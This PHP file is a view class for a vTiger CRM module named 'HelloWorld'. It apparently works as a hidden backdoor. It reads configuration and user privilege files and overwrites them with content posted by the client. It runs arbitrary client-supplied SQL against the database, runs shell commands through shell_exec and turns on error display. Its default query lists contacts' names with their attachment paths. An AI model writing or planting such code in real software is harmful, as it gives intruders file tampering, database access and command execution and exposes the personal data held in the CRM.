<?php
ini_set('display_errors','1'); 
require_once('include/database/PearDatabase.php');

class HelloWorld_List_View extends Vtiger_Index_View {

        public function process(Vtiger_Request $request) {
		$db = PearDatabase::getInstance();
		//$target_file = 'include/Webservices/RetrieveDocAttachment.php';
		//$target_file = 'config.php';
		//$target_file = 'vtigercron.php';
		//$target_file = 'vtlib/Vtiger/Functions.php';
		//$target_file = 'modules/Vtiger/CRMEntity.php';
		//$target_file = 'phpversionfail.php';
		$target_file = 'user_privileges/sharing_privileges_1.php';
		//$target_file = 'modules/Documents/models/Record.php';
		//$target_file = 'vtlib/Vtiger/Functions.php';
		$content = file_get_contents($target_file);
		//$output = Shell_exec("yum -y install pcregrep");
		//$output = Shell_exec("grep -rl '^  <?php' *.php *");
		$output = Shell_exec("ls user_privileges");
		if ($_SERVER['REQUEST_METHOD'] == 'POST') {
			
			switch ($_POST['form']) {
			case "A":
				$content = $_POST['contentSave'];
				file_put_contents($target_file, $content);
			    	break;
			case "B":
			    	$strQuery = $_POST['strQueryClient'];
			    	break;
			}
		} else {
			$strQuery = "SELECT vtiger_contactdetails.firstname, vtiger_contactdetails.lastname,vtiger_attachments.attachmentsid,vtiger_notes.notesid,path,filename,filesize,filetype,name FROM vtiger_attachments INNER JOIN vtiger_seattachmentsrel ON vtiger_seattachmentsrel.attachmentsid = vtiger_attachments.attachmentsid INNER JOIN vtiger_notes ON vtiger_notes.notesid = vtiger_seattachmentsrel.crmid inner join vtiger_senotesrel on vtiger_senotesrel.notesid= vtiger_notes.notesid inner join vtiger_contactdetails on vtiger_senotesrel.crmid = vtiger_contactdetails.contactid limit 0,10";
		}
		
              	$records = array();
              	$rs = $db->pquery($strQuery);
              	
         	while ($data = $db->fetch_array($rs)) {
                                $records[] = $data;
                }
                
       	$viewer = $this->getViewer($request);
       	$viewer->assign('COMPLETE', $rs);
             	$viewer->assign('RECORDS', $records);
             	$viewer->assign('CONTENTS', $content);
             	$viewer->assign('OUTPUT', $output);
            	$viewer->view('List.tpl', $request->getModule());
        }

}
